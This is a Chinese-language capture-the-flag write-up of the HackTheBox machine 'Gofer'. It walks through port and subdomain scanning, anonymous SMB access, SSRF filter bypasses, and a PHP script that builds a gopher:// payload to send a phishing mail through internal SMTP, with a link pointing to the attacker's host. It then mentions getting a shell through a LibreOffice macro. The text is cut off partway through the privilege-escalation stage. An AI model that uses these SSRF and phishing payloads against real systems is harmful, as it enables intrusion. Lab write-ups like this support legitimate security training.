---
title: Gofer - HackTheBox
url: https://darkwing.moe/2023/07/31/Gofer-HackTheBox/
source: 喵喵喵喵
date: 2023-08-01
fetch_date: 2025-10-06T16:59:29.788717
---

# Gofer - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Gofer - HackTheBox

# Gofer - HackTheBox

##### 2023-07-31

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. SMB](#SMB)
   1. [3.1. mail](#mail)
4. [4. 子域名扫描](#子域名扫描)
5. [5. proxy](#proxy)
   1. [5.1. url ssrf](#url-ssrf)
   2. [5.2. filter](#filter)
6. [6. SSRF SMTP](#SSRF-SMTP)
   1. [6.1. ssrf.php](#ssrf-php)
7. [7. libreoffice to shell](#libreoffice-to-shell)
8. [8. user flag](#user-flag)
9. [9. 信息](#信息)
10. [10. notes](#notes)
    1. [10.1. user](#user)
    2. [10.2. notes](#notes-1)
    3. [10.3. backup](#backup)
11. [11. 提权 & root flag](#提权-amp-root-flag)
    1. [11.1. UAF](#UAF)
    2. [11.2. backup](#backup-1)
    3. [11.3. root flag](#root-flag)
    4. [11.4. shadow](#shadow)
12. [12. 参考资料](#参考资料)

# Gofer - HackTheBox

2023-07-31

# 基本信息

* <https://app.hackthebox.com/machines/Gofer>
* 10.10.11.225

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073101.jpg)

# 端口扫描

22,80,开了smb的Linux，还有被过滤的25:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.225 Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 13:37 CST Nmap scan report for 10.10.11.225 Host is up (0.13s latency). Not shown: 995 closed tcp ports (conn-refused) PORT    STATE    SERVICE     VERSION 22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA) |   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA) |_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519) 25/tcp  filtered smtp 80/tcp  open     http        Apache httpd 2.4.56 |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Did not follow redirect to http://gofer.htb/ 139/tcp open     netbios-ssn Samba smbd 4.6.2 445/tcp open     netbios-ssn Samba smbd 4.6.2 Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Host script results: | smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required | smb2-time: |   date: 2023-07-31T05:39:01 |_  start_date: N/A  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.02 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.225 gofer.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073102.jpg)

# SMB

smb匿名访问，backup里得到一个mail:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python3 ~/Tools/impacket/examples/smbclient.py miao@10.10.11.225 -no-pass ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073103.jpg)

查看邮件内容，提到Jocelyn容易被邮件钓鱼,libreoffice odt格式，并且提到网络代理现在正在做限制访问

## mail

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022 Return-Path: <jdavis@gofer.htb> X-Original-To: tbuckley@gofer.htb Delivered-To: tbuckley@gofer.htb Received: from gofer.htb (localhost [127.0.0.1])         by gofer.htb (Postfix) with SMTP id C8F7461827         for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST) Subject:Important to read! Message-Id: <20221028192857.C8F7461827@gofer.htb> Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST) From: jdavis@gofer.htb  Hello guys,  Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.  PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit> ``` |

# 子域名扫描

子域名扫描可以发现proxy，应该就是邮件里提到的代理：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://gofer.htb/" -H 'Host: FUZZ.gofer.htb' -fw 20  [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 165ms]     * FUZZ: proxy ``` |

# proxy

添加hosts，直接访问是401，但根据前面邮件内容，限制访问是正在做，那就是还没完成，直接POST请求可以得到缺少url参数信息(小细节,post根目录还是401，/index.php才能得到信息):

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073104.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073105.jpg)

## url ssrf

添加url测试，确认存在SSRF:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073106.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073107.jpg)

## filter

url参数还存在一些过滤,例如file协议和127，file协议可以简单的绕过：

* SSRF Cheat Sheet & Bypass Techniques
  <https://highon.coffee/blog/ssrf-cheat-sheet/>
* SSRF (Server Side Request Forgery) - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073108.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073109.jpg)

127 ip过滤也可以通过简单的进制转换绕过：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073110.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073111.jpg)

# SSRF SMTP

根据已有信息，重点是前面邮件里提到的钓鱼和内部邮件，SMTP外部被过滤但可以内部访问，那就可以通过SSRF来通过gopher协议和SMTP交互发邮件：

* Server-Side Request Forgery to Internal SMTP Access | by Muh. Fani Akbar | InfoSec Write-ups
  <https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2>
* tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers
  <https://github.com/tarunkant/Gopherus>
* Web-Application-Attack/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md at master · rhamaa/Web-Application-Attack
  <https://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md>

钓鱼目标用户根据前面邮件知道是Jocelyn，然后根据主站team页面中的全名和邮件中邮箱格式知道Jocelyn的邮件地址是`Jhudson@gofer.htb`

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073112.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073113.jpg)

## ssrf.php

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` <?php         $commands = array(                 'HELO gofer.htb',                 'MAIL FROM: <miao@miao.com>',                 'RCPT TO: <Jhudson@gofer.htb>',                 'DATA',                 'Subject: SSRF HERE',                 'http://10.10.14.6:7777/test_miao',                 '.'         );          $payload = implode('%0A', $commands); // memisahkan tiap command dengan newline          echo urlencode('gopher://0x7f000001:25/_' . $payload); ?> ``` |

# libreoffice to shell

现在可以成功钓鱼让目标用户点击我们发送的链接，下一步就是具体利用了，根据前面信息知道用的libreoffice，需要odt格式：

msf自带的几个libreoffice模块测试都不行 ,只能自己手动来，libreoffice可以直接使用shell：

* Using Malicious LibreOffice Calc Macros to Target Linux
  <https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html>

参考上面的文章手动编辑分配宏，区别就是文章用的表格，odt需要是文档。制作完之后同样的发送钓鱼，得到jhudson：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073114.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073115.jpg)

# user flag

jhudson用户目录得到user.txt:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023073116.jpg)

# 信息

查看home目录发现后还有其他几个用户,运行pspy发现定时运行的curl，其中得到tbuckley账号密码：

|  |  |
| --- | ---...